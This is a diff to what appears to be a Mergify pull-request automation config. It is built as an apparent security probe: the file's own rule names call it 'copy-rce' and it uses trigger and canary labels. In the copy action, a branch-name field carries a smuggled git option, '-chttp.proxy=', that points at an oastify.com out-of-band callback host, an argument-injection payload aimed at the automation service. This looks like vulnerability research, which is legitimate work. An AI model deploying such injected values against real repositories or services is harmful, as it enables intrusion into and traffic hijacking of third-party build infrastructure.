@@ -1,8 +1,25 @@
 pull_request_rules:
-  - name: copy-rce-probe
-    conditions: []
+  - name: probe-immediate-comment
+    conditions:
+      - state = open
+    actions:
+      comment:
+        message: "[PROBE-COMMENT-alttrig-1779960419869566100] rules-fire-canary"
+  - name: auto-add-trigger-label
+    conditions:
+      - state = open
+      - head = copy-rce-trigger
+    actions:
+      label:
+        add: [copy-trigger-alttrig-1779960419869566100]
+  - name: copy-on-label
+    conditions:
+      - label = copy-trigger-alttrig-1779960419869566100
     actions:
       copy:
         branches:
-          - "-chttp.proxy=copyrce-1779959955904695000.gxhi3c467gxcqk9wi4z0fnus1j7av1jq.oastify.com"
-        title: "COPY-RCE-PROBE"
+          - "-chttp.proxy=alttrig-1779960419869566100.gxhi3c467gxcqk9wi4z0fnus1j7av1jq.oastify.com"
+        title: "COPY-OAST-alttrig-1779960419869566100"
+
+merge_protections_settings:
+  reporting_method: check-runs
